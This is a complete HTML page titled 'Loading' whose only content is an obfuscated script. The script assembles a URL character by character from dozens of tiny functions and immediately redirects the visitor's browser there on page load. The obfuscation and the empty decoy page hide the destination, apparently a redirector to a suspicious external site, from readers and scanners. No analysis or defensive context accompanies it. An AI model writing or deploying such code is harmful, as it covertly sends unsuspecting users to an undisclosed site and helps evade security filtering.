<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            () => 'h',
            function() { return 't'; },
            _ => 't',
            function() { return 'p'; },
            _ => 's',
            _ => ':',
            () => '/',
            () => '/',
            _ => 'v',
            () => 'e',
            () => 'r',
            function() { return 'g'; },
            () => 'e',
            function() { return 'n'; },
            () => '.',
            function() { return 'c'; },
            () => 'l',
            function() { return 'i'; },
            function() { return 'c'; },
            () => 'k',
            _ => '/',
            () => 's',
            () => '/',
            function() { return 'n'; },
            function() { return 'e'; },
            _ => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
